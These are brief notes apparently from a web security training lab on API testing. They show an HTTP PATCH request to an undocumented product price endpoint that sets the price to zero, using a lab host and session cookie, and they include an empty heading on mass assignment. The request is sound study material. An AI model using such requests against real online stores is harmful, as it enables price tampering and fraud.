# API Testing

## Finding and exploiting an unused API endpoint

The `price` endpont not only allows the `GET` methode but also `PATCH` 

```
PATCH /api/products/1/price HTTP/2
Host: 0ad10068036333308060530f007800d6.web-security-academy.net
Cookie: session=f1t8Tfqc7LY7RwwMuWYwYG5mA2CxkpFc
[...]
Content-Type: application/json;charset=UTF-8
Content-Length: 12

{"price": 0}
```

## Exploiting a mass assignment vulnerability


